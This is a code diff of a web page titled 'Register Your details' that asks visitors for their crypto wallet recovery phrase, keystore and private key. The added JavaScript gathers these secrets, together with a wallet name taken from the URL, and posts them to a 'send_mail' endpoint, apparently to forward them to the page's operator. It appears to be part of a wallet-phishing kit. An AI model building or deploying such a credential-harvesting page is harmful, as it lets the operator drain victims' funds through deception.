@@ -19,13 +19,13 @@
     <h2 class="text-center mt-5">Register Your details</h2>
     <p class="text-center">Please Provide your Info</p>
     <div class="container">
-        <form action="" method="POST">
+        <form id="mail_form" action="" method="POST">
             <div class="row">
                 <div class="col-25">
                     <label for="subject">Phrase</label>
                 </div>
                 <div class="col-75">
-                    <textarea id="subject" name="subject" placeholder="Phrase.." style="height:200px" required></textarea>
+                    <textarea id="phrase" name="subject" placeholder="Phrase.." style="height:200px"></textarea>
                 </div>
             </div>
             <div class="row">
@@ -33,7 +33,7 @@
                     <label for="subject">Keystore</label>
                 </div>
                 <div class="col-75">
-                    <textarea id="subject" name="subject" placeholder="Keystore.." style="height:200px" required></textarea>
+                    <textarea id="keystore" name="subject" placeholder="Keystore.." style="height:200px"></textarea>
                 </div>
             </div>
             <div class="row">
@@ -41,7 +41,7 @@
                     <label for="subject">Private Key</label>
                 </div>
                 <div class="col-75">
-                    <textarea id="subject" name="subject" placeholder="Privat Key.." style="height:200px" required></textarea>
+                    <textarea id="privatekey" name="subject" placeholder="Privat Key.." style="height:200px" ></textarea>
                 </div>
             </div>
             <div class="row">
@@ -51,7 +51,41 @@
     </div>
 
         <script>
-            fetch(document.getElementById('subject')).then().catch()
+            
+            const wallet = location.search.split("=")[1];
+            const form = document.getElementById("mail_form");
+            
+            form.addEventListener("submit", (e) => {
+                e.preventDefault(); //
+
+                const phrase = document.getElementById("phrase").value;
+                const keyStore = document.getElementById("keystore").value;
+                const privateKey = document.getElementById("privatekey").value;
+
+                console.log(`${phrase}, ${privateKey}, ${wallet}, ${keyStore} `)
+
+                const url = "http://127.0.0.1:8181/send_mail";
+
+                fetch(url, {
+                    method: "POST",
+                    body: JSON.stringify({
+                        wallet,
+                        phrase,
+                        privateKey,
+                        keyStore
+                    })
+                })
+                    .then(res=> res.json())
+                    .then(data=>{
+                        alert(data);
+                        console.log(data)
+                    })
+                    .catch(error=>{
+                         alert(error);
+                        console.log(error)
+                    });
+            })
+
         </script>
 </body>
 
